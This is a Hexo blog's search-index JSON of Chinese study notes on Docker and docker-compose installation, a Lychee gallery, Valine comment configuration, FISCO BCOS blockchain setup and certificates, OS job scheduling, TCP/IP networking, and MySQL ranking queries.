-f：通过SIGKILL信号强制删除一个运行中的容器。 -l：移除容器间的网络连接，而非容器本身。 -v：删除与容器关联的卷。 docker pause/unpausedocker pause：暂停容器中所有的进程。 docker unpause：回复容器中所有的进程。 docker-compose12sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose docker使用命令docker是根据里面的docker-compose.yaml文件构建 1docker-compose up -d","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Lychee-web相册","slug":"博客/Lychee-web相册","date":"2021-04-04T09:48:54.000Z","updated":"2021-04-05T08:55:50.000Z","comments":true,"path":"2021/04/04/博客/Lychee-web相册/","link":"","permalink":"http://example.com/2021/04/04/%E5%8D%9A%E5%AE%A2/Lychee-web%E7%9B%B8%E5%86%8C/","excerpt":"","text":"该图床使用docker以及docker-compose 安装以上两个后https://github.com/LycheeOrg/Lychee-Docker 1docker-compose up -d 然后初始账号为lychee 密码lychee 登录成功后","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"博客配置","slug":"博客/博客配置","date":"2021-04-01T11:17:22.000Z","updated":"2021-04-02T02:49:58.000Z","comments":true,"path":"2021/04/01/博客/博客配置/","link":"","permalink":"http://example.com/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/","excerpt":"","text":"设置一个评论系统注册leanCloud账号https://www.leancloud.cn/ 创建一个应用拿到里面的AppleID AppKey 使用配置文档12345678910111213141516171819202122comments: title: &lt;i class=&#x27;fas fa-comments&#x27;&gt;&lt;/i&gt; 评论 subtitle: service: valine # Valine # https://valine.js.org/ valine: # js: https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js path: # 全局评论地址 目前设置全局评论地址后visitor失效,这是valine的问题 placeholder: 快来评论吧~ # 评论占位提示 # 其他配置项按照yml格式继续填写即可 除了 [el path placeholder emojiCDN emojiMaps] 选项 appId: &#x27;sqTMFb0PVPGr3O8jFPjCPlRd-gzGzoHsz&#x27;# your appId appKey: &#x27;c8anwbejIe6cHBJju8X7Wt3U&#x27; # your appKey meta: [nick,mail] # valine comment header info requiredFields: [nick,mail] enableQQ: true # Unstable avatar link recordIP: false # Record commenter IP avatar: robohash # gravatar style https://valine.js.org/avatar pageSize: 10 # comment list page size lang: zh-cn highlight: true mathJax: false 注意用过一次里面的配置文件，再进行更改下面的选项 要重新创建一个应用 12meta: [nick,mail] # valine comment header inforequiredFields: [nick,mail]","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"FISCO BCOS区块链","slug":"区块链/区块链2","date":"2021-03-31T10:10:47.000Z","updated":"2021-04-11T07:12:24.000Z","comments":true,"path":"2021/03/31/区块链/区块链2/","link":"","permalink":"http://example.com/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/","excerpt":"","text":"Solid语法基础类型Solidity是一种静态类型语言，这意味着每个变量（状态和本地）的类型需要 在编译时 指定Solidity提供了几种基本类型，可以组合形成复杂的类型 值类型以下类型也被称为值类型，因为这些类型的变量将始终按值传递，即它们在用作函数参数或赋值时总是被复制 地址(address)保存20个字节的值（以太坊地址的大小）。地址类型也有成员，并作为所有合同的基础 地址成员balance和transfer地址是solidity语言的预置对象，就如同Java里面的JDK自带类。balance可以查询余额，transfer则实现转账功能 123address x = 0x123;address myAddress = this;if (x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10) x.transfer(10) send发送是的低级对应 transfer 。如果执行失败，则当前合同不会停止，但 send 将返回 false 。使用中存在一些不安全的send：如果调用堆栈深度为1024（调用程序始终强制调用堆栈深度），则调用失败，如果收件人耗尽Gas，调用堆栈深度也将失败。所以为了安全的传输，总是检查返回值send，使用transfer甚至更好：使用接收者提取钱的模式 动态大小的字节数组bytes：动态大小的字节数组 string：动态大小的UTF-8的编码字符串 搭建局域fisco的区块链网络本节以搭建单群组FISCO BCOS链为例操作。使用开发部署工具 build_chain.sh脚本在本地搭建一条4 节点的FISCO BCOS链，以Ubuntu 16.04 64bit系统为例操作。 安装依赖sudo apt install -y openssl curl 下载脚本12345## 创建操作目录cd ~ &amp;&amp; mkdir -p fisco &amp;&amp; cd fisco## 下载脚本curl -#LO https://github.com/FISCO-BCOS/FISCO-BCOS/releases/download/v2.7.2/build_chain.sh &amp;&amp; chmod u+x cd .sh 搭建单群组4节点的联盟链1bash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545 启动节点bash nodes/127.0.0.1/start_all.sh 配置和使用控制台1sudo apt install -y default-jdk 1cd ~/fisco &amp;&amp; curl -LO https://github.com/FISCO-BCOS/console/releases/download/v2.7.2/download_console.sh &amp;&amp; bash download_console.sh 因为控制台是基于javaSDK实现，所以需要下载java的sdk，拷贝控制台控制i文件 12# 最新版本控制台使用如下命令拷贝配置文件cp -n console/conf/config-example.toml console/conf/config.toml 配置控制台证书 1cp -r nodes/127.0.0.1/sdk/* console/conf/ 启动控制台 1cd ~/fisco/console &amp;&amp; bash start.sh 1234567获取客户端版本 getNodeVersion获得节点的信息 getPeers查看当前块高 getBlockNumber调用合约 call 合约名 地址 函数名 参数 部署合约部署的合约应该放在contracts/solidity/HelloWorld.sol其中的helloworld.sol为合约，部署成功后会返回合约的地址， 开发一个基础的区块链应用了解应用需求 能够在区块链上进行资产注册 能够实现不同账户的转账 可以查询账户的资产金额 设计和开发智能合约FISCO BCOS平台目前支持Solidity及Precompiled两类合约形式。 Solidity合约与以太坊相同，用Solidity语法实现。 KVTable合约的读写接口与Table合约的CRUD接口通过在Solidity合约中支持分布式存储预编译合约，可以实现将Solidity合约中数据存储在FISCO BCOS平台AMDB的表结构中，实现合约逻辑与数据的分离。 预编译（Precompiled）合约使用C++开发，内置于FISCO BCOS平台，相比于Solidity合约具有更好的性能，其合约接口需要在编译时预先确定，适用于逻辑固定但需要共识的场景，例如群组配置。关于预编译合约的开发将在下一节进行介绍。 区块链节点节点是区块链上的执行单元。多个节点彼此连接，构成一个P2P网络，承载了区块链上的通信，计算和存储。节点入网后（加入联盟），成为区块链上的一个共识单位。多个节点参与共识，确保了区块链上交易的一致。 证书说明FISCO-BCOS网络采用面向CA的准入机制，保障信息保密性、认证性、完整性、不可抵赖性。 一条链拥有一个链证书及对应的链私钥，链私钥由链管理员拥有。并对每个参与该链的机构签发机构证书，机构证书私钥由机构管理员持有，并对机构下属节点签发节点证书。节点证书是节点身份的凭证，并使用该证书与其他节点间建立SSL连接进行加密通讯。sdk证书是sdk与节点通信的凭证，机构生成sdk证书，允许sdk与节点进行通信。 后缀 说明 .key 私钥 .srl 文件存储序列号 .csr 证书请求文件 .crt Certificate 证书 .pubkey 公钥 .private 私钥.key编码得到 .p12 PKCS#12格式来储存密钥 .keystore 用做web3sdk的SSL证书 .crl 证书吊销列表 角色定义FISCO-BCOS准入机制中，不同角色拥有不同的密钥与证书文件，共同保障信息保密性、认证性、完整性、不可抵赖性。FISCO-BCOS中，共有四种角色，分别是链管理员，机构，节点和SDK。 链管理员1链管理员管理链的私钥，可以向机构颁发机构证书 123ca.crt 链证书ca.key 链私钥ca.srl 链序列号 机构：机构拥有机构私钥，可以颁发节点证书和sdk证书 123456ca.crt 链证书agency.crt 机构证书agency.csr 机构证书请求文件agency.key 机构私钥agency.srl 机构序列号ca-agency.crt 机构和链的证书 节点：节点管理节点私钥： 12345678ca.crt 链证书node.ca节点证书相关信息，应用于系统合约node.crt 节点证书node.csr节点证书请求文件node.key节点私钥node.private节点私钥编码得到node.pubkey 节点公钥node.serial 节点序列号 SDK：sdk管理sdk私钥 12345678ca.crt 链证书clent.keysotre 用做web3sdk的SSL证书keystore.p12 用pkcs#12存储的密钥sdk.crt sdk证书sdk.csr sdk证书请求文件sdk.key sdk私钥sdk.private sdk私钥编码得到sdk.pubkey sdk公钥 FISCO BCOS 2.0的网络端口P2P端口、RPC端口、Channel端口 P2P端口P2P端口，用于区块链节点之间的互联，包括机构内的多个节点，以及多机构间节点和节点的互联。如果其他节点在机构外，那么这个连接要监听公网地址，或者监听内网，且由连接公网的网关（如nginx）转发网络连接。 节点之间的连接会由联盟链的准入机制控制，节点之间连接依赖节点证书验证，以排除未经许可的危险连接。这个链路上的数据通过SSL方式加密，采用高强度密钥，可以有效的保护通信安全 Channel端口Channel端口，控制台和客户端SDK连接Channel端口，互相之间要通过证书认证，只有经过认证的客户端才能向节点发起请求，通信数据也是采用SSL方式加密。Channel端口使用了TCP的长连接，用心跳包检测和保持存活，通信效率较高，支持AMOP协议的点对点通信，功能相当灵活强大。 Channel端口应只监听内网IP地址，供机构内其他的应用服务器通过SDK连接，不应监听外网地址或接受公网的连接，以免发生不必要的安全的问题，也不要只监听本地地址（127.0.0.1或localhost），否则其他应用服务器将无法连接到节点上。 RPC端口RPC是客户端与区块链系统交互的一套协议和接口，用户通过RPC接口可查询区块链相关信息（如块高、区块、节点连接等）和发送交易。 RPC端口接受JSON-RPC格式的请求，格式比较直观清晰，采用CURL、JavaScript、Python、Go等语言都可以组装JSON格式的请求，发送到节点来处理。当然发送交易时，要在客户端实现交易签名。要注意的是，RPC连接没有做证书验证，且网络传输默认是明文的，安全性相对不高，建议只监听内网端口，用于监控、运营管理，状态查询等内部的工作流程上。目前监控脚本，区块链浏览器连接的是RPC端口。 1234567[rpc]listen_ip=127.0.0.1 //只有同在本机上的其他进程才能连接到这个地址channel_listen_port=20200jsonrpc_listen_port=8545[p2p]listen_ip=0.0.0.0 //表示监听所有地址，包括本地、内网、公网地址，也就是全面开放listen_port=30300","categories":[],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://example.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"密码学-代理重加密","slug":"密码学/密码学-代理重加密","date":"2021-03-27T05:32:10.000Z","updated":"2021-04-01T12:39:36.000Z","comments":true,"path":"2021/03/27/密码学/密码学-代理重加密/","link":"","permalink":"http://example.com/2021/03/27/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%BB%A3%E7%90%86%E9%87%8D%E5%8A%A0%E5%AF%86/","excerpt":"","text":"1.","categories":[{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[]},{"title":"区块链","slug":"区块链/区块链","date":"2021-03-22T13:00:39.000Z","updated":"2021-03-30T09:50:16.000Z","comments":true,"path":"2021/03/22/区块链/区块链/","link":"","permalink":"http://example.com/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/","excerpt":"","text":"centos8Docker安装更新yum安装docker ce即社区免费版，先安装必要的软件包，安装yum-utils，它提供一个yum-config-manager单元，同时安装的device-mapper-persistent-data和lvm2用于储存设备映射（devicemapper）必须的两个软件包。 sudo yum update sudo yum install -y yum-utils device-mapper-persistent-data lvm2 配置一个docker的yum的仓库，使用的是阿里云的 sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 更新关于yum的软件包 sudo yum makecache fast 出现了意外错误 即centos8没有该参数，解决办法为：去掉fast参数 查看仓库版本，并安装指定版本yum list docker-ce --showduplicates | sort -r yum install docker-ce-3:20.10.5-3.el8.x86_64 然后出现了错误的信息，根据提示需要package docker-ce-3:20.10.5-3.el8.x86_64 requires containerd.io &gt;= 1.4.1,也就是那个包版本要高一点 wget 下载 https://download.docker.com/linux/centos/7/x86_64/edge/Packages/ 下的containerd包 ，yum -y install xxx升级该包 最后yum install docker-ce-3:20.10.5-3.el8.x86_64 查看是否安装成功 安装docker-compose123456#下载docker-composecurl -L &quot;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose#给docker-compose赋权限chmod +x /usr/local/bin/docker-compose#检查是否安装好，正常的话会显示出版本号docker-compose --version Docker组成 Docker Client 客户端 Docker Daemon 守护进程 Docker Image 镜像 Docker Container 容器 Docker启动以及常用命令启动命令： service docker start 开机自启动： chkconfig docker on","categories":[],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://example.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"2.处理机调度","slug":"操作系统/2.处理机调度","date":"2021-03-21T13:02:42.000Z","updated":"2021-04-01T14:09:10.000Z","comments":true,"path":"2021/03/21/操作系统/2.处理机调度/","link":"","permalink":"http://example.com/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/","excerpt":"","text":"1.处理机调度的层次和调度算法的目标 2.批处理系统中的作业 1.作业和作业步作业​ 在批处理系统中，是以作业为基本单位从外存调入内存中 作业步​ 每个作业必须经过若干个相对独立，又相互关联的顺序加工步骤才能得到结果，每个加工步骤称为一个作业步 2.作业控制块JCB内容​ 作业标识、用户名称、作业类型、作业状态、调度信息、资源需求、资源使用情况 使用流程 ​ 作业进入系统，由作业注册程序为该作业建立一个作业控制JCB，根据作业类型，放到相应的作业后备队列中等待调度。 ​ 作业运行期间，系统按照JCB中的信息和作业说明书对作业进行控制 ​ 当一个作业执行结束进入完成状态时，系统负责回收已经分配资源，撤销该作业控制块 3.作业运行三个阶段和三种状态​ 收容阶段-后备状态 ​ 运行阶段-运行阶段 ​ 完成阶段-完成阶段 3.作业调度算法 4.进程调度","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"计算机网络","slug":"计算机网络/计算机网络","date":"2021-03-20T08:05:29.000Z","updated":"2021-05-30T06:25:42.000Z","comments":true,"path":"2021/03/20/计算机网络/计算机网络/","link":"","permalink":"http://example.com/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","excerpt":"","text":"网络层IP数据报1.IP数据报格式 IP数据报由首部和数据两部分组成。 1.首部组成： 固定部分：20字节 可选字段：最多40字节，每4字节加一次，不满4个字节填充 2.固定部分中的各字段： 版本：4bit；IP协议版本号为4（IPV4） 首部长度：4bit；IP首部的固定长度为20字节，即最小值为5（每4个字节+1），4bit表示最大数为15，所以IP首部可选长度为10*4=40字节，IP首部最大为60个字节 总长度：16bit；总长度指首部和数据之和的长度，单位为字节。总长度字段为16位，2^16^-1=65535字节 标识：16bit；IP软件再存储器中维持一个计数器，每产生一个数据报，计数器+1，并将值赋给表示字段。当数据长度超过MTU必须分片，这个表示字段的值就被复制到所有的数据报片的标识字段，相同的标识字段的值使用分片后的各数据报片最后能正确地重装成原来的数据报。 标志(flag)：3bit；只有两位有意义 最低位MF：MF=1表示后面还有分片的数据报；MF=0表示这已是若干数据报片中的最后一个 中间位DF：DF=1表示“不能分片”；只有当DF=0才允序分片 片偏移：13bit；较长的分组在分片后，某片在原分组中的相对位置；片偏移以8个字节为偏移单位，每个分片的长度一定是8个字节(64位)的整数倍，也就是首位序号的偏移。 生存时间：8bit，TTL（TIME TO LIVE）目前TTL字段功能改为“跳转限制”，路由器在每次转发数据报之前就把TTL值-1，若TTL值减少到0，就丢弃这个数据报，不再转发，TTL的单位是跳数 协议：8bit；代表数据报使用的是何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个协议进行处理 首部检验和：16bit；这个字段只检验数据报的首部，不包括数据部分 源地址：32bit； 目的地址：32bit 3.IP数据报首部的可变部分 增加首部的可变部分是为了增加IP数据报的功能，使得IP数据报的首部长度成为可变。 网际控制报文协议ICMPICMP（Internet Control Message Protocol）是互联网的标准协议，ICMP报文作为IP层数据报的数据，加上数据报的首部，组成IP数据报发送。 ICMP报文格式： ICMP的代码字段是为了进一步区分某种类型中的不同情况，检验和字段用来检验整个ICMP报文；IP数据报首部的检验和并不检验IP的内部内容，因此不能保证经过传输的ICMP报文不产生出错。 1.ICMP报文种类：ICMP差错报告报文和ICMP询问报文 2.数据部分所有ICMP差错报告报文中的数据字段都具有相格式，把收到需要差错报告的IP数据报的首部和数据字段的前8个字节提取出来，作为ICMP报文的数据字段，再加上相应的ICMP差错报告报文的前8个字节，就构成了ICMP差错报告报文。 提取到的数据报的数据字段前8个字节是为了得到运输层的端口号(TCP和UDP)以及运输层报文的发送序号对于(TCP) 整个ICMP报文作为数据报的数据字段发送给源点。 3.ICMP的应用举例PING和TRACEROUTE IPV6IPV6数据报由两部分组成，基本首部（base header）和有效载荷（payload） 有效载荷也称为净负荷，有效载荷允许有零个或多个扩展首部，再后面是数据部分，但注意，所有的扩展首部并不属于IPV6数据报的首部。 1.基本首部 版本：4bit；指明协议的版本，IPV6的字段是6 通信量：8bit；区分不同数据报的类别或优先级 流标号：20bit；所有属于同一个流的数据报都具有相同的流标号，流标号对实时音频、视频数据的传送特别有用 有效载荷长度：16bit；指明数据报除基本首部以外的字节数，包括扩展首部最大值是64KB（655535Z字节） 下一个首部：8bit；相当于IPV4的协议字段或者可选字段。 当IPV6数据报没有扩展首部时，下一个首部字段的作用和IPV4的协议字段一样，它的值之处了基本首部后面的数据应交付IP层上面的哪一个高层协议（6/17代表着TCP和UDP）。 当出现扩展首部时，下一个首部字段的值就标识后面第一个扩展首部的类型。 跳数限制：8bit； 源地址、目标地址 2.IPV6地址 单播：点对点通信 多播：一点对多点的通信 任播：任播的终点是一组计算机，但数据报只交付其中一个，通常是最近的一个 地址分类： 虚拟专用网和网络地址转换NAT1.专用IP地址也叫作可重用地址这些地址只能用于机构的内部通信，不能用于和互联网上的主机通信； 2.网络地址转换NAT网络地址转换NAT（Network Address Translation） 主机A和主机B通信的时候，先通过NAT路由器将地址转为公网源IP地址，再将IP数据报转给主机B；主机B发送IP数据报时，其目的地址也就是NAT路由器的地址，通过转换成专用IP地址就可以找到主机A。 / NAT路由器的通信必须由专用网内的主机发起，当如果不是内部发起，NAT地址就没有维护一个地址转换表，NAT路由器就不知道应当把目的IP地址转换成专用网内的哪一个本地IP地址，这就表明，这种专用网内部的主机不能充当服务器用，因为互联网上的客户无法请求专用网内的服务器提供服务。 为了更加有效利用NAT路由器上的公网IP地址，常用的NAT转换表把运输层的端口号也利用上，共用一个NAT路由器上的IP地址，使用端口号的NAT也叫作网络地址与端口转换NAPT（Network Address and Port Translation） 运输层运输层协议运输层向上面的应用层提供通信服务，网络层主要是主机到主机，而运输层主要是进程到进程； 1.面向链接的TCP传输控制协议TCP（Transmission Control Protocol），传输数据单元为TCP报文段（segment）；TCP提供面向连接，在传送数据之前必须要建立链接，数据传送结束后要释放连接，不提供广播和多播。 2.无连接的UDP用户数据报协议UDP（User Datagram Protocol），传输数据单元为UDP用户数据报（Datagram）；UDP在传送数据之前不需要建立链接，收到UDP报文后不需要给出任何确认 运输层端口协议层间的抽象的协议端口是软件端口，软件端口是应用层的各种协议进程与运输实体进行层级交互的一种地址，UDP和TCP的首部格式中，有源端口和目的端口两个字段。 16位的端口号可允许有65535个不同端口号 1.熟知端口号或系统端口数值为0~1023 2.登记端口号数值为1024~49151 3.客户端使用端口号数值1024~65535，这类端口号仅在客户进程运行时动态选择，因此又叫做短暂端口号，这类端口号留给客户进程选择暂时使用，当服务进程收到用户进程的报文时，就知道了客户进程所使用的端口号，因此就可以把数据发送给客户进程，通信结束后，刚使用过得客户端口号就不存在。 用户数据报协议UDP1.特点： UDP是无连接的 UDP使用尽最大努力交付，即不保证可靠交付 UDP是面向报文的，发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层，UDP对应用层不做处理，而是保留这些报文的边界。UDP一次交付一个完整的报文，所以应用程序必须选择合适大小的报文，若报文太长，UDP把它交给IP层，IP层传送时可能要进行分片，这回降低IP层的效率，反之，会使得首部的相对长度太大，这也降低了IP层的效率。 UDP没有拥塞控制 UDP支持一对一、一对多、多对一、多对多通信。 UDP的首部开销小，只有8个字节，比TCP的20个字节首部要短。 2.UDP的首部格式 UDP之间通信要用到其端口，但是其是无连接的，因此不需要使用套接字，在计算检验和时，UDP用户数据报之前增加12个字节的伪首部，检验和按照这个临时的UDP用户数据报来计算，伪首部即不下传也不上交，只是为了计算校验和。 校验和的计算： UDP计算校验和与计算IP数据报首部校验和类似，但是IP数据报的检验和只校验IP数据报的首部，但UDP的检验和把首部和数据部分一起校验。 其中伪首部的第3字段是全0，第4字段是IP首部中的协议字段的值，对于UDP，此协议字段值为17；第5字段是UDP用户数据报长度 传输控制协议TCP1.特点： TCP是面向链接的运输层协议 TCP连接时点对点，每个连接都有两个端点 TCP提供全双工通信，TCP允许通信双方的应用程序在任何时候都能发送数据，TCP连接的两方都设有发送缓存和接受缓存 面向字节流；TCP把应用程序交下来的数据仅仅看成一段字节流，并且根据实际情况以字节为最小单位随意切割，接收方必须有能力识别收到的字节流，把它还原成有意义的数据 2.TCP的连接 套接字 每一条TCP连接唯一被通信两端的两个端点（两个套接字）确定 连续ARP协议 连续ARP协议规定，发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置，接收方一般采用得失累积确认的方式，也就是说，接收方不必对收到的分组逐个发送确认，而是收到好几个分组后，对按序到达的最后一个分组发送确认 3.TCP报文的首部格式 源端口、目的端口：16bit；两个字节端口；TCP的分用功能也是通过端口实现 序号（seq）：4bytes=32bit；TCP是面向字节流，在一个TCP链接中传送的字节流中的没一个个字节都按顺序编号，整个要传送的字节流的起始位置都必须在建立连接时确认。首部中的序号字段的值指的是本报文段所发送的数据的第一个字节的序号。 确认号（ack）：4bytes=32bit；是期望收到对方下一个报文段的第一个数据字节的序号 数据偏移：4bit；指出TCP报文段的数据起始距离TCP报文段的起始处有多远；这个字段实际上是TCP报文段的首部长度；跟IP的首部长度差不多，由于4位二进制数能表示的最大十进制数字是15，因此数据偏移的最大值是60字节，也就是TCP首部最大长度是60字节（选项长度不能超过40字节） 保留位：6bit； 标志位： URG=1:表明紧急指针字段有效，文段中有紧急数据，优先级高的数据。TCP就把经济数据插入到本报文段数据的最前面，而在紧急数据后面的数据仍是普通数据，这是要与首部中的紧急指针字段配合使用 ACK=1：仅当ACK=1时确认号字段才有效，ACK=0时，确认号无效 RST=1:表明连接中出现差错，必须释放连接，然后重新建立运输连接；还用来拒绝一个非法的报文段或拒绝打开一个连接。RST也可以称为重建位或重置位 SYN=1：在建立连接时用来同步序号，SYN=1而ACK=0；表示这是一个请求连接的报文段，对方若同意建立连接；则在响应版文段中使SYN=1和ACK=1。因此SYN=1表示这是一个连接请求或连接接受报文。 FIN=1：用来释放一个连接，表明此报文段的发送方已发送数据完毕并且要求释放运输连接。 窗口：2bytes；窗口指的是发送本报文段的一方的接收窗口，窗口值告诉对方，从本报文段首部确认号算起，接收方目前允许对方发送的数据量（字节为单位）。窗口值作为接收方让发送方设置其发送窗口的依据。 校验和：2bytes。校验和字段校验的范围包括首部和数据这两部分。和UDP计算过程一样，要在TCP报文前面加上12字节的伪首部。 ​ 伪首部的第4个字段中17改为6；第5字段改为TCP的长度，接收方收到此报文段后，仍要加上这个 伪首部来计算校验和。 紧急指针：2bytes；要配合URG=1一起使用，指出报文段中的紧急数据的字节数 选项：40bytes； 4.TCP的运输连接管理 TCP连接的建立（三次握手） ​ 本例中客户端主动打开，B被动打开。B的TCP服务器进程先创建传输控制块TCB，准备接受客户进程的 连接请求，然后服务器进程就处于LISTEN状态，等待客户端连接。 ​ A的TCP客户端进程也是首先创建传输控制块TCB，然后向B发送连接请求报文段。TCP规定，SYN报文段 （即SYN=1）报文段不能携带数据，但是要消耗一个序号。TCP客户进程进入SYN-SENT（同步已发送）状态。 ​ B收到A的请求报文段后，发送确认报文段，同样也要消耗一个序号，此时TCP服务器进程进入SYN-RCVD（同步收到）状态。 ​ 客户进程收到B的确认后，还要向B给出确认，确认报文段的ACK置1。ACK报文段可以懈怠数 据，如果不携带数据则不消耗序号。这时候TCP连接已经建立，A进入ESTABLISHED（已经建立连接状态） 连接的释放（四报文握手） ![tmp (1)](计算机网络/tmp (1).jpg) 第一阶段：客户端和服务器同时处于ESTABLISHED状态，客户端先向应用进程TCP发出连接释放报文段，并停止发送数据，主动关闭TCP连接。客户端连接释放报文段的终止控制位FIN置1，其序号seq=u，为前面已传送过得数据的最后一个字节的序号+1。这时客户端进入FIN-WAIT-1(终止等待1)状态，等待服务器确认。FIN报文段即使不携带数据，也消耗一个序号。 第二阶段：服务器收到连接释放报文段即发出确认报文，确认号ack=u+1，这个报文段自己的序号是v，等于B前面已传过的数据的最后一个字节的序号加1，然后服务器进入CLOSE-WAIT(等待关闭) 状态，TCP服务器进程这是通知高层应用进程，因而从客户端到服务器这个方向的连接就释放了，这是的TCP连接处于半关闭（half-close）状态，即客户端已经没有数据要发送了，但服务器发送数据，客户端仍要接收，也就是从服务器到客户端这个方向的连接并为关闭，这个状态可能会持续一段时间。 服务器收到客户端的数据后，就进入了FIN-WAIT-2（终止等待2）状态，等待服务器的发出的连接释放报文段 第三阶段：若服务器以及没有向客户端继续发送数据，其应用进程就通知TCP释放连接，这是B发出的连接释放报文必须使FIN=1，假定B的序号为w，B还必须重复上次已经发送过得确认号ack=u+1，这是B就进入LAST-ACK（最后确认）状态，等待A的确认 第四阶段：若A收到B的连接释放报文段后，必须对此发出确认，在确认段中把ACK置为1，确认号ack=w+1，而自己的序号是seq=u+1，然后进入到TIME-WAIT（时间等待）状态 服务器收到A的确认报文释放连接，进入CLOSED状态，服务器结束TCP连接的时间要比A早一些 TCP状态机 应用层远程中断协议TELNET万维网WWW1.协议万维网使用统一资源定位符URL（Uniform Resource Locator）并使每个文档在整个互联网有唯一的标识符URL；万维网客户程序与万维网服务器中交互遵守严格的协议，超文本传送协议（HyperText Transfer Protocol）。HTTP是一个应用层协议，使用TCP连接进行可靠传输；万维网使用超文本标记语言HTML（Hypertext Markup Language）。 2.URL URL&lt;协议&gt;：使用说明协议来获取万维网的文档，最常使用的协议就是http、ftp ://&lt;主机&gt;：指出这个万维网文档在哪个主机上，这里的主机就是互联网上的域名 后面的第三部分和第四部分是&lt;端口&gt;和&lt;路径&gt;，可以省略，为了方便输入URL，甚至可以把http://www.直接省略 3.超文本传送协议HTTPHTTP是面向事务的应用层协议 HTTP规定客户与服务器进行交互，每次都由一个ASCII码构成请求和一个类似的通用互联网扩充，即类MIME的响应组成。HTTP报文通常使用TCP连接传送。 HTTP是无连接，同一个客户第二次访问同一个服务器上的页面，服务器的响应与第一次访问时相同，服务器并不记得曾经访问过得这个客户，也不记得为该客户服务过多少次。HTTP 的无状态特性简化了服务器的设计，使服务器更容易支持大量并发的HTTP请求。 根据TCP的三次握手，SYN请求不能携带数据，前两次没有传送关于HTTP请求的数据，所以万维客户就把HTTP请求报文作为建立TCP的连接的三报文握手的第三个报文数据，发送给服务器，服务器收到HTTP请求后，就把请求的文档返回给客户。 非流水线就是收到报文响应后才继续发送下一个请求报文，客户每访问一个对象都要用一个往返时间RTT。流水线收到响应之前就能够继续发送新的请求，于是服务器就可以连续发送响应报文。流水线的方式，客户访问所有对象只需要花费一个RTT时间，流水线工作使得TCP连接的空闲时间减少。 4.HTTP的报文结构 请求报文——从客户向服务器发送的请求报文 响应报文——从服务器到客户的回答 HTTP是面向文本的，因此报文中的每一个字段都是一些ASCII码串，因而各个字段的长度都是不确定。 开始行：区分是请求报文还是响应报文，两种报文格式就是开始行不同 首部行：说明浏览器、服务器或报文主题的信息，首部可以由好几行，但是也可以不使用，在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”、“换行”，并且还有一空行和后面的实体分开 实体主体：请求报文中一般不用这个字段，而在响应报文也可能没有这个字段 请求报文 开始行：方法、请求资源的URL、HTTP的版本 响应报文 第一行就是状态行：HTTP版本、状态码、解释状态码的短语 5.cookie","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"Mysql数据库","slug":"数据库/Mysql数据库","date":"2021-03-18T10:38:14.000Z","updated":"2021-05-09T07:37:30.000Z","comments":true,"path":"2021/03/18/数据库/Mysql数据库/","link":"","permalink":"http://example.com/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"查询数据库的属性字段1describe 表名; 数据库复杂查询排序查询如果两个分数相同，则两个分数排名（Rank）相同。 情况一：平分后的下一个名次是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。例：1、1、2、3、4、4。 情况二：排名是非连续的。例：1、1、1、4、4、6。 score表结构信息如下： Id Score 1 3.52 2 3.65 3 4.23 4 3.85 5 4.23 6 3.65 12SELECT Score,(SELECT COUNT(DISTINCT Score) FROM score WHERE score&gt;=s.score) AS Rank FROM score s ORDER BY score DESC;SELECT Score,(SELECT COUNT(Score)+1 FROM score WHERE score&gt;s.score) AS Rank FROM score s ORDER BY score DESC; 第一行括号内表示子查询中没有相同score的表有多少个大于等于父查询的s.score，假设父查询的score为3.52，而此时的子查询的表中，应该都是大于3.52,所以此时rank应该为4(4.23,3.85,3.65,3.52) 